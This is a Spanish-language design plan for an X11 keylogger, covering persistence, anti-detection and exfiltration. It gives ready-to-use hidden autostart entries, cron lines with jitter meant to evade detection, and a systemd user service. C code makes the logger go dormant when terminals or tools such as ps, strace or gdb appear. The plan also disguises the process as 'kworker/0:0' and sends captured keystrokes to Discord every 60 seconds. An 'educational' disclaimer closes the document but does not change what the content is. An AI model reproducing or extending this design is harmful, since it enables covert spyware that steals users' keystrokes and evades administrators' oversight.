# Plan de Persistencia para X11 Keylogger

## 📋 Índice
1. [Visión General](#visión-general)
2. [Mecanismos de Persistencia](#mecanismos-de-persistencia)
3. [Detección de Terminales](#detección-de-terminales)
4. [Modo Inactivo (Sleep Mode)](#modo-inactivo-sleep-mode)
5. [Implementación Técnica](#implementación-técnica)
6. [Arquitectura Final](#arquitectura-final)

---

## Visión General

El objetivo es que el keylogger:
1. **Persista** después de reinicio del sistema
2. **Se ejecute automáticamente** al iniciar sesión X11
3. **Entre en reposo** si detecta actividad sospechosa (terminal abierta)
4. **Reanude operación** cuando sea seguro
5. **Mantenga cobertura de logs** incluso en inactividad

### Niveles de Implementación

| Nivel | Complejidad | Persistencia | Sigilo |
|-------|-------------|--------------|--------|
| **Básico** | Baja | Sesión actual | Bajo |
| **Intermedio** | Media | Reinicio del usuario | Medio |
| **Avanzado** | Alta | Multi-usuario, reinicio | Alto |

---

## Mecanismos de Persistencia

### 1. **Persistencia por Sesión (Inmediata)**

#### 1.1 Autostart con Desktop Entry (.desktop)
```
Ubicación: ~/.config/autostart/x11_monitor.desktop
Ventajas:
  ✅ Se ejecuta al iniciar sesión X11/GNOME/KDE
  ✅ No requiere root
  ✅ Funciona con la mayoría de DMs (GDPR)
  ✅ Invisible a menos que se busque explícitamente
  
Desventajas:
  ❌ No persiste a reinicio de sistema completo
  ❌ Requiere acceso al $HOME del usuario
```

**Implementación:**
```ini
[Desktop Entry]
Type=Application
Name=System Monitor
Exec=/path/to/x11_keylogger --daemon
Hidden=true
NoDisplay=true
StartupNotify=false
```

#### 1.2 Shell RC Files (.bashrc, .zshrc)
```
Ubicación: ~/.bashrc, ~/.zshrc, ~/.profile
Ventajas:
  ✅ Se ejecuta cada vez que abre una terminal
  ✅ Muy común, difícil de detectar
  ✅ Sin necesidad de archivos adicionales visibles
  
Desventajas:
  ❌ Solo si el usuario abre terminal
  ❌ Se puede detectar durante auditoría
  ❌ Educativo: NO RECOMENDADO para proyecto
```

### 2. **Persistencia por Reinicio (Cron + Systemd)**

#### 2.1 Cron Job (Usuario)
```
Ubicación: crontab -e (usuario)
Ventajas:
  ✅ Se ejecuta periódicamente incluso después de reinicio
  ✅ Sin privilegios elevados necesarios
  ✅ Fácil de mantener
  
Desventajas:
  ❌ Se ve en `crontab -l`
  ❌ Requiere acceso a crontab
  ❌ Puede ser eliminado fácilmente
```

**Implementación:**
```cron
# Ejecutar cada 5 minutos, reintentar si falla
*/5 * * * * pgrep x11_keylogger || /usr/local/bin/x11_keylogger --daemon 2>/dev/null

# O con jitter para evadir detección de patrones
# 5-15 min aleatorios
*/5 * * * * if [ $((RANDOM % 3)) -eq 0 ]; then pgrep x11_keylogger || /usr/local/bin/x11_keylogger --daemon; fi
```

#### 2.2 Systemd User Service (Recomendado)
```
Ubicación: ~/.config/systemd/user/x11-monitor.service
Ventajas:
  ✅ Se ejecuta automáticamente tras reinicio
  ✅ Integrado con sesión del usuario
  ✅ Reintentos automáticos si falla
  ✅ Logs en journalctl (si se configura)
  
Desventajas:
  ❌ Visible en `systemctl --user list-units`
  ❌ Requiere systemd (estándar en distribuciones modernas)
```

**Implementación:**
```ini
[Unit]
Description=X11 System Monitor
After=graphical-session.target
PartOf=graphical-session.target

[Service]
Type=simple
ExecStart=/usr/local/bin/x11_keylogger --daemon --quiet
Restart=always
RestartSec=30
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=graphical-session.target
```

**Activación:**
```bash
systemctl --user daemon-reload
systemctl --user enable x11-monitor.service
systemctl --user start x11-monitor.service
```

#### 2.3 Systemd User Timer (Alternativa con Jitter)
```
Ubicación: ~/.config/systemd/user/x11-monitor.timer
Ventajas:
  ✅ Ejecución periódica con jitter integrado
  ✅ Difícil de detectar (se ve como timer, no proceso)
  ✅ Reintentos automáticos
```

### 3. **Persistencia Multi-Usuario (Avanzada)**

#### 3.1 Init Script (Requiere root)
```bash
# Ubicación: /etc/init.d/x11-monitor (SysVinit)
# O: /usr/lib/systemd/system/x11-monitor.service (Systemd)
```

⚠️ **NOTA EDUCATIVA**: Esto requiere acceso root y es detectible. Solo para propósitos de educación en laboratorios controlados.

---

## Detección de Terminales

### 🔍 ¿Por qué detectar terminales?

Una terminal abierta podría indicar:
- Auditoría de seguridad (usuario buscando procesos)
- Análisis del sistema por el administrador
- Investigación de comportamiento sospechoso
- Comando `ps` o `top` siendo ejecutado

### Métodos de Detección

#### Método 1: Monitoreo de Procesos (Process Scanning)
```c
int is_terminal_open(void) {
    // Buscar procesos de terminal: bash, zsh, sh, tmux, screen, etc.
    // Leer /proc/[pid]/comm para cada proceso vivo
    // Si encuentra procesos interactivos activos, retorna 1
}
```

**Ventajas:**
- ✅ Detecta terminales activas en tiempo real
- ✅ Puede enumerar comandos ejecutados

**Desventajas:**
- ❌ Usar `/proc` puede ser sospechoso si lo hacemos frecuentemente
- ❌ Algunos sistemas restringen acceso a `/proc`
- ❌ Detectable si alguien monitorea syscalls

#### Método 2: Monitoreo de TTY (Terminal Devices)
```c
int check_active_ttys(void) {
    // Buscar en /dev/tty*, /dev/pts/*
    // Verificar si están en uso con fstat()
    // Si hay terminales activas, retorna 1
}
```

**Ventajas:**
- ✅ Más directo que escanear /proc
- ✅ Menos syscalls

**Desventajas:**
- ❌ TTY remoto (SSH) podría no detectarse
- ❌ No detecta terminales inactivas

#### Método 3: Monitoreo de Variables de Entorno (Ligero)
```c
int is_user_active(void) {
    // Verificar si TERM está set
    // Monitorear SHELL env var
    // Buscar indicadores de shell interactivo
}
```

**Ventajas:**
- ✅ Muy ligero, sin syscalls costosas
- ✅ Difícil de detectar

**Desventajas:**
- ❌ Menos preciso
- ❌ Puede tener falsos positivos/negativos

#### Método 4: Monitoreo de Actividad de Red (Avanzado)
```c
int suspicious_network_activity(void) {
    // Buscar conexiones SSH entrantes/salientes
    // Verificar si hay SCP o transferencia de archivos
    // Buscar patrones de auditoría (conexiones a puertos específicos)
}
```

**Ventajas:**
- ✅ Detecta intrusión remota
- ✅ Detecta exfiltración de logs

**Desventajas:**
- ❌ Requiere analizar netstat/ss
- ❌ Puede ser detectado si se hace frecuente

---

## Modo Inactivo (Sleep Mode)

### ⏸️ Concepto

El keylogger entra en "sleep mode" cuando detecta:
- Terminal abierta activa
- Comandos como `ps`, `top`, `netstat`
- Acceso a logs/archivos del sistema
- Múltiples SSH simultáneos

### Estados de Operación

```
ESTADO: NORMAL
├─ Capturando keystrokes
├─ Enviando datos cada 60s (Discord/HTTP)
└─ Log activo en keylog.txt

        ↓ (Detecta terminal/suspicious activity)

ESTADO: SLEEP MODE
├─ Pausa captura de teclado
├─ Pausa envío de datos
├─ Mantiene proceso vivo (para persistencia)
├─ No escribe en logs (evita detectabilidad)
└─ Monitorea estado cada 5s

        ↓ (60s sin actividad sospechosa)

ESTADO: NORMAL (regresa)
```

### Implementación: Estados de Sleep

```c
typedef enum {
    STATE_NORMAL,      // Capturando activamente
    STATE_SLEEP,       // En reposo, monitoreando
    STATE_SUSPENDED    // Completamente suspendido (por signal)
} KeyloggerState;

typedef struct {
    int state;
    time_t last_activity;
    int sleep_counter;  // Cuenta regresiva para despertar
} SleepState;
```

### Lógica de Transición

```
┌─────────────────┐
│   DORMIDO (1)   │  Monitorea cada 5s
│  NO captura     │  Sin I/O a disco
│  NO envía datos │  Proceso "invisible"
└─────────────────┘
        ↑
        │ (Sin actividad sospechosa por 60s)
        │
┌─────────────────┐
│   NORMAL (0)    │  Captura keystroke
│  SÍ captura     │  Envía datos
│  SÍ envía       │  Escribe logs
└─────────────────┘
        ↑
        │ (Terminal detectada)
        │
```

---

## Implementación Técnica

### Archivo 1: `persistence.h`
```c
#ifndef PERSISTENCE_H
#define PERSISTENCE_H

// Mecanismos de persistencia
int install_desktop_entry(const char *binary_path);
int install_cron_job(const char *binary_path);
int install_systemd_user_service(const char *binary_path);

// Detección de amenazas
int is_terminal_open(void);
int is_auditing(void);
int check_suspicious_processes(void);

// Sleep mode
typedef enum {
    STATE_NORMAL = 0,
    STATE_SLEEP = 1,
    STATE_SUSPENDED = 2
} OperationState;

int get_operation_state(void);
void set_operation_state(OperationState state);
void update_sleep_timer(void);

#endif
```

### Archivo 2: `persistence.c` (Skeleton)
```c
#include "persistence.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <fcntl.h>

// ============ PERSISTENCIA ============

int install_desktop_entry(const char *binary_path) {
    // 1. Crear directorio ~/.config/autostart/
    // 2. Escribir archivo .desktop
    // 3. Establecer permisos 644
    // 4. Retornar 0 en éxito, -1 en error
}

int install_cron_job(const char *binary_path) {
    // 1. Generar línea cron con jitter
    // 2. Agregar a crontab del usuario
    // 3. Retornar 0 en éxito
}

int install_systemd_user_service(const char *binary_path) {
    // 1. Crear ~/.config/systemd/user/
    // 2. Escribir archivo .service
    // 3. systemctl --user daemon-reload
    // 4. systemctl --user enable
    // 5. Retornar 0 en éxito
}

// ============ DETECCIÓN ============

int is_terminal_open(void) {
    // Implementación Método 2: Monitorear TTYs
    // Leer /dev/tty* y /dev/pts/*
    // Retorna: 1 si hay terminal activa, 0 si no
}

int is_auditing(void) {
    // Buscar procesos sospechosos:
    // - ps, top, htop, systemctl
    // - lsof, netstat, ss
    // - strace, ltrace, gdb
    // Retorna: 1 si detecta auditoría
}

int check_suspicious_processes(void) {
    // Escanear /proc/*/cmdline
    // Buscar palabras clave: "monitor", "log", "key"
    // Retorna: 1 si encuentra algo sospechoso
}

// ============ SLEEP MODE ============

static OperationState current_state = STATE_NORMAL;
static time_t last_activity = 0;

int get_operation_state(void) {
    return current_state;
}

void set_operation_state(OperationState state) {
    current_state = state;
    if (state == STATE_NORMAL) {
        last_activity = time(NULL);
    }
}

void update_sleep_timer(void) {
    // Lógica de transición de estados
    
    if (current_state == STATE_NORMAL) {
        // Verificar si debe entrar en sleep
        if (is_terminal_open() || is_auditing()) {
            current_state = STATE_SLEEP;
            return;
        }
    }
    
    if (current_state == STATE_SLEEP) {
        // Verificar si puede despertar
        time_t now = time(NULL);
        if (!is_terminal_open() && 
            !is_auditing() && 
            (now - last_activity) > 60) {  // 60s sin actividad
            current_state = STATE_NORMAL;
        }
    }
}
```

### Integración en `x11_keylogger.c`

Modificaciones necesarias:

1. **En main()**: Agregar opción `--install-persistence`
   ```c
   if (strcmp(argv[i], "--install-persistence") == 0) {
       install_desktop_entry(binary_path);
       install_systemd_user_service(binary_path);
       printf("✓ Persistencia instalada\n");
       exit(0);
   }
   ```

2. **En loop principal**: Integrar chequeo de sleep
   ```c
   while (g_state.running) {
       update_sleep_timer();
       
       if (get_operation_state() == STATE_SLEEP) {
           // No capturar, solo monitorear
           usleep(500000);  // 0.5s
           continue;
       }
       
       // Captura normal de eventos...
       XRecordProcessReplies(g_state.record_display);
   }
   ```

3. **En callback XRecord**: Respetar sleep state
   ```c
   void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
       if (get_operation_state() != STATE_NORMAL) {
           // No registrar si estamos en sleep
           XRecordFreeData(recorded_data);
           return;
       }
       
       // Procesamiento normal...
   }
   ```

---

## Arquitectura Final

```
┌─────────────────────────────────────────────────────────┐
│         x11_keylogger (MAIN EXECUTABLE)                 │
├─────────────────────────────────────────────────────────┤
│  Core Features:                                         │
│  ├─ Captura de eventos X11                             │
│  ├─ Logging a disco                                    │
│  ├─ Exfiltración (Discord/HTTP)                        │
│  └─ Daemon mode                                        │
└─────────────────────────────────────────────────────────┘
        ↓ (Llama durante inicio)
┌─────────────────────────────────────────────────────────┐
│  PERSISTENCIA (persistence.c)                           │
├─────────────────────────────────────────────────────────┤
│  Instalación:                                           │
│  ├─ ~/.config/autostart/x11-monitor.desktop            │
│  ├─ ~/.config/systemd/user/x11-monitor.service         │
│  └─ ~/.crontab entry (opcional)                        │
│                                                         │
│  Monitoreo Continuo:                                    │
│  ├─ Chequeo de TTYs activos                            │
│  ├─ Monitoreo de procesos sospechosos                  │
│  └─ Gestión de estado NORMAL/SLEEP                     │
└─────────────────────────────────────────────────────────┘
```

### Timeline de Ejecución

```
Tiempo 0s:   Usuario inicia sesión
  ├─ ~/.bashrc sourced
  ├─ ~/.config/autostart/x11-monitor.desktop procesado
  └─ systemd/user activa x11-monitor.service
  
  → x11_keylogger inicia con --daemon

Tiempo 0-5s: Inicialización
  ├─ Conecta a X11
  ├─ Abre archivo de log
  ├─ Inicia thread de exfiltración
  ├─ Cambia nombre del proceso: "kworker/0:0"
  └─ Entra en loop de captura (STATE_NORMAL)

Tiempo 5-60s: Operación Normal
  ├─ Captura keystrokes
  ├─ Actualiza sleep timer cada 5s
  ├─ Envía datos a Discord cada 60s
  └─ Monitorea estado (¿terminal abierta?)

Tiempo 60s: Usuario abre terminal (bash)
  ├─ TTY detectado en /dev/pts/
  ├─ set_operation_state(STATE_SLEEP)
  └─ Pausa captura (sin I/O)

Tiempo 120s: Usuario ejecuta "ps aux"
  ├─ is_auditing() = 1
  └─ Permanece en STATE_SLEEP

Tiempo 180s: Usuario cierra terminal
  ├─ No hay TTYs activos
  ├─ Cuenta regresiva para despertar
  └─ Después 60s → STATE_NORMAL

Tiempo 240s+: Reinicio sistema
  ├─ Systemd activa x11-monitor.service
  ├─ Desktop entry procesa x11-monitor.desktop
  ├─ Cron ejecuta (si está instalado)
  └─ x11_keylogger reinicia automáticamente
```

---

## Resumen de Mecanismos Recomendados

| Mecanismo | Persistencia | Sigilo | Facilidad | Recomendación |
|-----------|--------------|--------|-----------|---------------|
| Desktop Entry | Sesión | Alto | Muy Fácil | ✅ Primario |
| Systemd Service | Reinicio | Alto | Fácil | ✅ Primario |
| Cron Job | Reinicio | Medio | Fácil | ⚠️ Alternativa |
| RC Files | Sesión | Medio | Muy Fácil | ❌ No recomendado |
| Init Script | Permanente | Bajo | Difícil | ❌ Requiere root |

---

## Consideraciones Éticas y Educativas

⚠️ **IMPORTANTE**: Este documento es para propósitos educativos ÚNICAMENTE.

1. **Laboratorio Controlado**: Use SOLO en sistemas propios o con consentimiento explícito
2. **Investigación de Seguridad**: Ideal para entender vectores de persistencia
3. **Defensa**: Aprenda a detectar estas técnicas
4. **Cumplimiento Legal**: Verifique leyes locales antes de implementar

---

## Bibliografía y Referencias

- [MITRE ATT&CK: Persistence](https://attack.mitre.org/tactics/TA0003/)
- [Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [X11 Security Model](https://www.x.org/)
- [systemd User Services](https://wiki.archlinux.org/title/Systemd/User)
- [Cron Security Considerations](https://www.man7.org/linux/man-pages/man5/crontab.5.html)

